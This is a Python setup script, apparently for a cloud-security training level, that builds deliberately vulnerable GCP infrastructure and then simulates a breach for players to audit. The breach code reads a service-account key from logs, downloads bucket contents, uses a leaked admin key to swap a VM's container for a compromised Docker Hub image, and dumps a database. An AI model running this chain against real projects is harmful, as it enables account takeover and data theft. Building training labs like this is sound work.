import random
import os
import subprocess
import time
import json
import csv
import sqlalchemy
import google.auth
import requests
import shutil

from googleapiclient import discovery
from sqlalchemy.sql import text
from google.oauth2 import service_account, id_token
from core.framework import levels
from google.cloud import storage, logging as glogging
from core.framework.cloudhelpers import (
    deployments,
    iam,
    gcstorage,
    cloudfunctions
)
import google.auth.transport.requests
from google.auth.transport.requests import AuthorizedSession

LEVEL_PATH = 'defender/audit'
FUNCTION_LOCATION = 'us-central1'

def create(second_deploy=True):
    print("Level initialization started for: " + LEVEL_PATH)
    nonce = str(random.randint(100000000000, 999999999999))
    credentials, project_id = google.auth.default()

    #the cloud function may need to know information about the vm in order to hit our API. put that info here.
    func_template_args = {}

    func_upload_url = cloudfunctions.upload_cloud_function(
            f'core/levels/{LEVEL_PATH}/resources/rmUser', FUNCTION_LOCATION, template_args=func_template_args)

    config_template_args = {
        'nonce': nonce,
        'root_password': 'psw',
        'func_upload_url': func_upload_url
        }

    template_files = [
        'core/framework/templates/service_account.jinja',
        'core/framework/templates/iam_policy.jinja',
        'core/framework/templates/sql_db.jinja',
        'core/framework/templates/container_vm.jinja',
        'core/framework/templates/bucket_acl.jinja',
        'core/framework/templates/cloud_function.jinja'
        ]

    if second_deploy:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args,
            second_deploy=True
        )
    else:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args
        )

    print("Level setup started for: " + LEVEL_PATH)
    create_tables()
    dev_key = iam.generate_service_account_key('dev-account')
    dev_sa = service_account.Credentials.from_service_account_info(json.loads(dev_key))
    compute_admin_key = iam.generate_service_account_key('compute-admin')
    logging_key = iam.generate_service_account_key('log-viewer')
    # add vm files to bucket
    storage_client = storage.Client()
    vm_image_bucket = storage_client.get_bucket(f'vm-image-bucket-{nonce}')
    gcstorage.upload_directory_recursive(f'core/levels/{LEVEL_PATH}/resources/api-engine', f'vm-image-bucket-{nonce}')

    storage_blob = storage.Blob('compute-admin.json', vm_image_bucket)
    storage_blob.upload_from_string(compute_admin_key)
    
    #os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
    url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce

    req = google.auth.transport.requests.Request()
    id_token = google.oauth2.id_token.fetch_id_token(req, url)
    headers = {'Authorization': f"Bearer {id_token}"}
    data = {'name':'Robert Caldwell', 'authentication':dev_key}
    resp = req(url, method = 'POST', body = data, headers = headers)

    exploit(nonce, logging_key)
    hack()

    print(f'Level creation complete for: {LEVEL_PATH}')
    start_message = ('Helpful start message')
    levels.write_start_info(LEVEL_PATH, start_message, file_name="dev-account.json", file_content=dev_key)

def create_tables():
    credentials, project_id = google.auth.default()
    service = discovery.build('sqladmin', 'v1beta4', credentials=credentials)
    response = service.instances().list(project=project_id).execute()
    connection_name = response['items'][0]['connectionName']
    instance_name = response['items'][0]['name']
    user = {'kind':'sql#user','name':'api-engine','project':project_id,'instance':instance_name,'password':'psw'}
    service.users().insert(project=project_id, instance=instance_name, body=user).execute()

    proxy = subprocess.Popen([f'core/levels/{LEVEL_PATH}/cloud_sql_proxy', f'-instances={connection_name}=tcp:5432'])
    time.sleep(5)

    db_config = {
        "pool_size": 5,
        "max_overflow": 2,
        "pool_recycle": 1800,  # 30 minutes
    }

    db = sqlalchemy.create_engine(
        sqlalchemy.engine.url.URL(
            drivername="postgresql+pg8000",
            username="api-engine",
            password="psw",
            database="userdata-db",
            host='127.0.0.1',
            port=5432
        ),
        **db_config
    )
    db.dialect.description_encoding = None

    devs = csv.DictReader(open(f'core/levels/{LEVEL_PATH}/resources/devs.csv', newline=''))
    with db.connect() as conn:
        conn.execute(
            """
            CREATE TABLE users (
                user_id  SERIAL PRIMARY KEY,
                name     TEXT              NOT NULL,
                phone    TEXT              NOT NULL,
                address  TEXT              NOT NULL
            );
            CREATE TABLE devs (
                dev_id   SERIAL PRIMARY KEY,
                name     TEXT              NOT NULL,
                phone    TEXT              NOT NULL,
                address  TEXT              NOT NULL
            );
            CREATE TABLE follows (
                follow_id SERIAL PRIMARY KEY,
                follower INT   NOT NULL REFERENCES users(user_id),
                followee INT   NOT NULL REFERENCES users(user_id)
            );
            """
        )

        for dev in devs:
            stmt = text("INSERT INTO devs (name, phone, address) VALUES (:name, :phone, :address)")
            conn.execute(stmt, dev)
    db.dispose()
    proxy.terminate()


def exploit(nonce, logging_key):
    credentials, project_id = google.auth.default()
    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
    logger = logging_client.logger('rmUser')
    logs = logger.list_entries()
    dev_key = list(logs)[-1].payload['auth']
    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
    blobs = storage_client.list_blobs(f'vm-image-bucket-{nonce}')
    temp_dir = 'test/' ###TODO change me
    os.mkdir(temp_dir)
    for blob in blobs:
        blob.download_to_filename(f'{temp_dir}{blob.name}')

    with open(f'{temp_dir}compute-admin.json') as keyfile:    
        compute_admin_key = json.loads(keyfile.read())
    
    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    new_gce = '''
    metadata:
      name: a6
    spec:
      containers:
      - image: docker.io/aujxn/defender-audit-compromised:latest
        imagePullPolicy: Always
        name: a6
        ports:
        - containerPort: 80
          hostPort: 80
        volumeMounts: []
      volumes: []

  '''
    fingerprint = api_instance['metadata']['fingerprint']
    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
    compute_api.instances().setMetadata(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine', body=payload).execute()
    compute_api.instances().stop(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
    compute_api.instances().start(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
    shutil.rmtree(temp_dir)

def hack():
    credentials, project_id = google.auth.default()
    compute_api = discovery.build('compute', 'v1', credentials=credentials)
    response = compute_api.instances().list(project=project_id, zone='us-west1-b').execute()

    for instance in response['items']:
        if instance['name'] == 'api-engine':
            hostname = instance['networkInterfaces'][0]['accessConfigs'][0]['natIP']
            break

    url = f'http://{hostname}/hacked'

    payload = {'sql': 'select * from devs;'}
    response = requests.post(url, data=payload)
    print(response.text)


def destroy():
    levels.delete_start_files()
    deployments.delete()
